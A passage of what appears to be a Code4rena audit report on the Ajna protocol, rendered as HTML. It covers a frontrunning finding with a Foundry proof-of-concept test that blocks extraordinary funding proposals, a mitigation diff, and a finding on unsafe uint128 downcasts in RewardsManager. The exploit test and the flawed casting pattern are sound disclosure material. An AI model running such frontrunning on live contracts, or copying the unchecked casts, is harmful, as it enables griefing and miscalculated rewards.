version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Coded Proof of Concept</h3>\n<p>This test demonstrates how an adversary can frontrun the creation of an extraordinary proposal with a value of <code>endBlock</code> that will the proposal “end” instantly, while preventing the intended proposal to be created.</p>\n<p>Add this test to <code>ajna-grants/test/unit/ExtraordinaryFunding.t.sol</code> and run <code>forge test -m \"testProposeExtraordinary_Frontrun\"</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testProposeExtraordinary_Frontrun</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The user that will try to propose the funding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 14 tokenholders self delegate their tokens to enable voting on the proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_selfDelegateVoters</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set proposal params</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endBlockParam</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">100_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensRequestedParam</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">50_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// generate proposal targets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targets</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// generate proposal values</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// generate proposal calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSignature</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;transfer(address,uint256)&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokensRequestedParam</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/***********************************</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">         *          ATTACK BEGINS          *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">         ***********************************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// An attacker sees the proposal in the mempool and frontruns it.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// By setting an `endBlock_ == 0`, it will create a &quot;defeated&quot; proposal.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// So when the actual user tries to send the real proposal, that one will revert.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;attacker&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pastEndBlockParam</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">proposeExtraordinary</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">pastEndBlockParam</span><span class=\"mtk1\">, </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Extraordinary Proposal for Ajna token transfer to tester address&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Verify that the proposal is created and has a `Defeated` state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalState</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalState</span><span class=\"mtk1\">), </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Defeated</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/***********************************</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">         *           ATTACK ENDS           *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">         ***********************************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// When the user tries to send the proposal it will always revert.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// As a previous proposal with the same hash has been already sent, despite that having a malicious `endBlockParam`.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProposalAlreadyExists</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">proposeExtraordinary</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">endBlockParam</span><span class=\"mtk1\">, </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Extraordinary Proposal for Ajna token transfer to tester address&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add <code>endBlock_</code> to the hash of the proposal. This way there will be no impact in frontrunning the transaction, as the expected proposal will be stored.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function proposeExtraordinary(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 endBlock_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address[] memory targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256[] memory values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes[] memory calldatas_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        string memory description_) external override returns (uint256 proposalId_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       proposalId_ = _hashProposal(endBlock_, targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function executeExtraordinary(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       uint256 endBlock_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address[] memory targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256[] memory values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes[] memory calldatas_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 descriptionHash_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) external nonReentrant override returns (uint256 proposalId_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       proposalId_ = _hashProposal(endBlock_, targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/260#issuecomment-1555118034\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-10-unsafe-casting-from-uint256-to-uint128-in-rewardsmanager\" style=\"position:relative;\"><a href=\"#m-10-unsafe-casting-from-uint256-to-uint128-in-rewardsmanager\" aria-label=\"m 10 unsafe casting from uint256 to uint128 in rewardsmanager permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/227\">[M-10] Unsafe casting from <code>uint256</code> to <code>uint128</code> in RewardsManager</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/227\">Haipls</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L179\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L179</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L180\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L180</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L236\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L236</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L241\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L241</a></p>\n<p>Unsafe casting from <code>uint256</code> to <code>uint128</code> in RewardsManager, instances:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: 2023-05-ajna\\ajna-core\\src\\RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">178:             BucketState storage toBucket = stakeInfo.snapshot[toIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+179:             toBucket.lpsAtStakeTime  = uint128(positionManager.getLP(tokenId_, toIndex));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+180:             toBucket.rateAtStakeTime = uint128(IPool(ajnaPool).bucketExchangeRate(toIndex));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">181: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">235:             // record the number of lps in bucket at the time of staking</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+236:             bucketState.lpsAtStakeTime = uint128(positionManager.getLP(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">237:                 tokenId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">238:                 bucketId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">239:             ));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">240:             // record the bucket exchange rate at the time of staking</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+241:             bucketState.rateAtStakeTime = uint128(IPool(ajnaPool).bucketExchangeRate(bucketId));</span></span></span></code></pre>\n<p>can cause an overflow which, in turn, can lead to unforeseen consequences such as:</p>\n<ul>\n<li>The inability to calculate new rewards, as <code>nextExchangeRate > exchangeRate_</code> will always be true after the overflow.</li>\n<li>Reduced rewards because <code>toBucket.lpsAtStakeTime</code> will be reduced.</li>\n<li>Reduced rewards because <code>toBucket.rateAtStakeTime</code> will be reduced.</li>\n<li>In case <code>bucketState.rateAtStakeTime</code> overflows first but does not go beyond the limits in the new epoch, it will result in increased rewards being accrued.</li>\n</ul>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In <code>RewardsManager.stake()</code> and <code>RewardsManager.moveStakedLiquidity()</code>, the functions downcast <code>uint256</code> to <code>uint128</code> without checking whether it is bigger than <code>uint128</code> or not.</p>\n<p>In <code>stake()</code> &#x26; <code>moveStakedLiquidity()</code> when <code>getLP >= type(uint128).max</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">05</span><span class=\"mtk1\">-</span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">236</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">bucketState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpsAtStakeTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">positionManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getLP</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">237</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">bucketId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">239</span><span class=\"mtk1\">:             ));</span></span></span></code></pre>\n<p>Let’s assume, that the staker had LP in the bucket equal <code>type(uint128).max</code>, and his stake balance LP was recorded as 0. As a result, the reward for the epoch at the moment of the stake will be accrued as</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">05</span><span class=\"mtk1\">-</span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">504</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">interestEarned_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nextExchangeRate</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">exchangeRate_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bucketLP_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">05</span><span class=\"mtk1\">-</span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">internal</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">11</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">WAD</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">x</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span 